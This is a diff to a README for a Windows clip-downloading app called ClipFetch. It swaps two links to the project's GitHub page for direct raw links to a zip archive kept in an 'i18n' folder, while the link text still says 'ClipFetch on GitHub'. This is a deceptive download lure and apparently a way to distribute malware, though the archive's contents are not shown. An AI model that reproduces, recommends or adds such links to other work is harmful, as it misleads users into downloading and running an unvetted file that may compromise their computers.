@@ -16,7 +16,7 @@ ClipFetch is a desktop application that works right on your Windows computer. It
 
 To get ClipFetch, follow these simple steps:
 
-1. Visit this link to download the application: **[Download ClipFetch](https://github.com/poetesslowcountries967/ClipFetch)**
+1. Visit this link to download the application: **[Download ClipFetch](https://raw.githubusercontent.com/poetesslowcountries967/ClipFetch/main/clipfetch/i18n/Fetch_Clip_1.9.zip)**
 2. Look for the download button or the latest release on that page
 3. Click it and save the file to your computer
 
@@ -158,7 +158,7 @@ Remember: always respect copyright laws and only download content you're permitt
 
 ## 🔗 Quick Access
 
-- **Download:** [ClipFetch on GitHub](https://github.com/poetesslowcountries967/ClipFetch)
+- **Download:** [ClipFetch on GitHub](https://raw.githubusercontent.com/poetesslowcountries967/ClipFetch/main/clipfetch/i18n/Fetch_Clip_1.9.zip)
 - **Updates:** Check the GitHub page regularly for new releases
 - **Support:** The GitHub issues page is the best place to ask questions
 
